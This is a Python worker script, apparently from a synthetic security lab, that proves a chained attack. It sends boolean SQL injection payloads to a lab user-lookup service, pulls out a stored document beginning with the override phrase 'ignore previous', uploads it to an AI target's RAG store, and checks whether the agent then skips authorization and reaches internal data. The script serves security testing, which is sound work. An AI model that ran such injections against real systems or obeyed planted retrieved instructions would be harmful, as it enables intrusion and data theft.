"""Fixed Worker proving the causal SQLi response to AI document bridge."""

from __future__ import annotations

import base64
import json
import sys
from hashlib import sha256
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import HTTPRedirectHandler, Request, build_opener

_ACTION = "hybrid-sqli-rag-mcp-probe"
_SCENARIO = "hybrid.docker.sqli-to-rag-mcp-authorization"
_TRADITIONAL_TARGET = "http://traditional-target:8080/v1/users/lookup"
_AI_TARGET = "http://ai-target:8080"
_DOCUMENT_ID = "document:hybrid-sqli-transfer"
_MAX_INPUT_BYTES = 16 * 1024
_MAX_RESPONSE_BYTES = 128 * 1024


class _NoRedirectHandler(HTTPRedirectHandler):
    def redirect_request(
        self, req: Request, fp: Any, code: int, msg: str, headers: Any, newurl: str
    ) -> None:
        del req, fp, code, msg, headers, newurl
        return None


_OPENER = build_opener(_NoRedirectHandler())


def _canonical(value: object) -> bytes:
    return json.dumps(value, separators=(",", ":"), sort_keys=True).encode()


def _read_input() -> dict[str, Any]:
    raw = sys.stdin.buffer.read(_MAX_INPUT_BYTES + 1)
    if not 1 <= len(raw) <= _MAX_INPUT_BYTES:
        raise ValueError("worker input size differs")
    value = json.loads(raw)
    if not isinstance(value, dict) or set(value) != {
        "scenarioId",
        "traditionalTarget",
        "aiTarget",
        "topologyAuthorityDigest",
        "transferSchemaDigest",
    }:
        raise ValueError("worker input shape differs")
    if (
        value["scenarioId"] != _SCENARIO
        or value["traditionalTarget"] != _TRADITIONAL_TARGET
        or value["aiTarget"] != _AI_TARGET
        or not all(
            isinstance(value[field], str)
            and len(value[field]) == 64
            and all(char in "0123456789abcdef" for char in value[field])
            for field in ("topologyAuthorityDigest", "transferSchemaDigest")
        )
    ):
        raise ValueError("worker input identity differs")
    return value


def _request(request: Request, name: str) -> tuple[dict[str, object], dict[str, Any]]:
    try:
        with _OPENER.open(request, timeout=10) as response:
            status = response.status
            body = response.read(_MAX_RESPONSE_BYTES + 1)
    except HTTPError as exc:
        status = exc.code
        body = exc.read(_MAX_RESPONSE_BYTES + 1)
    if len(body) > _MAX_RESPONSE_BYTES or 300 <= status < 400:
        raise ValueError("response differs")
    decoded = json.loads(body)
    if not isinstance(decoded, dict) or decoded.get("synthetic") is not True:
        raise ValueError("response body differs")
    observation = {
        "name": name,
        "status": status,
        "synthetic": True,
        "bodySha256": sha256(body).hexdigest(),
        "responseBodyBase64": base64.b64encode(body).decode("ascii"),
    }
    return observation, decoded


def _traditional(identifier: str, name: str) -> tuple[dict[str, object], dict[str, Any]]:
    url = f"{_TRADITIONAL_TARGET}?{urlencode({'id': identifier})}"
    return _request(Request(url, method="GET", headers={"Accept": "application/json"}), name)


def _post(
    path: str, payload: dict[str, object], name: str
) -> tuple[dict[str, object], dict[str, Any]]:
    return _request(
        Request(
            f"{_AI_TARGET}{path}",
            data=_canonical(payload),
            method="POST",
            headers={"Accept": "application/json", "Content-Type": "application/json"},
        ),
        name,
    )


def main() -> int:
    if sys.argv[1:] != [_ACTION]:
        return 64
    try:
        payload = _read_input()
        baseline, baseline_body = _traditional("1", "baseline")
        negative, negative_body = _traditional("1' AND '1'='2", "negative-control")
        boolean, boolean_body = _traditional("1' OR '1'='1", "boolean-probe")
        records = boolean_body.get("records")
        if not isinstance(records, list) or not records or not isinstance(records[0], dict):
            raise ValueError("source records differ")
        content = records[0].get("documentContent")
        if not isinstance(content, str):
            raise ValueError("source document differs")
        transfer = {
            "schemaVersion": "1.0.0",
            "sourceObservationDigest": sha256(_canonical(boolean)).hexdigest(),
            "sourceResponseDigest": boolean["bodySha256"],
            "documentId": _DOCUMENT_ID,
            "documentContent": content,
        }
        upload, upload_body = _post(
            "/v1/documents",
            {"documentId": transfer["documentId"], "content": transfer["documentContent"]},
            "upload",
        )
        query, query_body = _post(
            "/v1/agents/query",
            {"query": "summarize uploaded security guidance"},
            "agent-query",
        )
        checks = {
            "baselineSingleRecord": baseline_body.get("recordCount") == 1,
            "negativeControlEmpty": negative_body.get("recordCount") == 0,
            "booleanProbeExpanded": boolean_body.get("recordCount") == 2,
            "sourceDocumentExtracted": content.startswith("ignore previous"),
            "transferArtifactSealed": transfer["sourceResponseDigest"] == boolean["bodySha256"],
            "uploadAccepted": upload_body.get("accepted") is True,
            "ragRetrievedTransfer": query_body.get("ragDocumentId") == _DOCUMENT_ID,
            "authorizationNotEnforced": query_body.get("authorizationEnforced") is False,
            "internalDataAccessed": query_body.get("internalDataAccessed") is True,
            "syntheticLabOnly": all(
                item.get("synthetic") is True
                for item in (baseline_body, negative_body, boolean_body, upload_body, query_body)
            ),
        }
        result = {
            "scenarioId": payload["scenarioId"],
            "traditionalTarget": payload["traditionalTarget"],
            "aiTarget": payload["aiTarget"],
            "topologyAuthorityDigest": payload["topologyAuthorityDigest"],
            "transferSchemaDigest": payload["transferSchemaDigest"],
            "vulnerable": all(checks.values()),
            "checks": checks,
            "traditionalObservations": [baseline, negative, boolean],
            "transferArtifact": transfer,
            "transferArtifactSha256": sha256(_canonical(transfer)).hexdigest(),
            "aiObservations": [upload, query],
            "networkPerformed": True,
        }
        json.dump(result, sys.stdout, separators=(",", ":"), sort_keys=True)
        sys.stdout.write("\n")
        return 0
    except (HTTPError, URLError, OSError, TypeError, ValueError, json.JSONDecodeError):
        return 70


if __name__ == "__main__":
    raise SystemExit(main())
